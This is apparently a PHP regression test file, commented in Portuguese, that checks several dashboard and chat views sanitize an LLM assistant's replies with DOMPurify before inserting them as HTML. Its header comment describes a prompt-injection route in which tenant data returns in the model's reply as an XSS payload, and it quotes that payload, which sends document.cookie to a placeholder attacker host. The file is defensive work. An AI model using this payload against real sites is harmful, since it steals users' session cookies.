<?php

uses(Tests\TestCase::class);

/**
 * Regressao — auditoria 2026-08-29 P2 (media).
 *
 * 4 pontos renderizavam resposta de LLM (Bruce AI) via `innerHTML` sem
 * sanitizacao — vetor de prompt injection: dado do proprio tenant (nome
 * de projeto/transacao/beneficiario) volta na resposta do LLM contendo
 * `<img src=x onerror=fetch('//attacker/'+document.cookie)>` e executa.
 *
 * Fix: `DOMPurify.sanitize(...)` envolve o markdown-lite antes do innerHTML.
 * DOMPurify carregado globalmente via layouts/app.blade.php.
 *
 * Este teste faz smoke check no conteudo dos arquivos — se alguem remover
 * o wrapper acidentalmente num refactor, a suite quebra antes do deploy.
 */

test('layouts/app.blade.php carrega DOMPurify globalmente', function () {
    $content = file_get_contents(base_path('resources/views/layouts/app.blade.php'));
    expect($content)->toContain('dompurify');
});

test('chat_widget sanitiza resposta do bot com DOMPurify.sanitize', function () {
    $content = file_get_contents(base_path('resources/views/partials/chat_widget.blade.php'));
    // marked.parse (raw) NAO pode aparecer sozinho no innerHTML
    expect($content)->not->toMatch('/innerHTML\s*=\s*marked\.parse/');
    // Deve envelopar em DOMPurify.sanitize
    expect($content)->toContain('DOMPurify.sanitize(marked.parse');
});

test('dashboards/ngo.blade.php sanitiza insight do Bruce', function () {
    $content = file_get_contents(base_path('resources/views/dashboards/ngo.blade.php'));
    // Padrao antigo sem sanitize NAO pode aparecer
    expect($content)->not->toMatch('/innerHTML\s*=\s*`<p[^`]*\$\{data\.insight\.replace/');
    expect($content)->toContain('DOMPurify.sanitize');
});

test('dashboards/common.blade.php sanitiza insight do Bruce', function () {
    $content = file_get_contents(base_path('resources/views/dashboards/common.blade.php'));
    expect($content)->not->toMatch('/innerHTML\s*=\s*`<p[^`]*\$\{text\.replace/');
    expect($content)->toContain('DOMPurify.sanitize');
});

test('dashboards/manager.blade.php sanitiza insight do Bruce', function () {
    $content = file_get_contents(base_path('resources/views/dashboards/manager.blade.php'));
    expect($content)->not->toMatch('/innerHTML\s*=\s*`<p[^`]*\$\{data\.insight\.replace/');
    expect($content)->toContain('DOMPurify.sanitize');
});
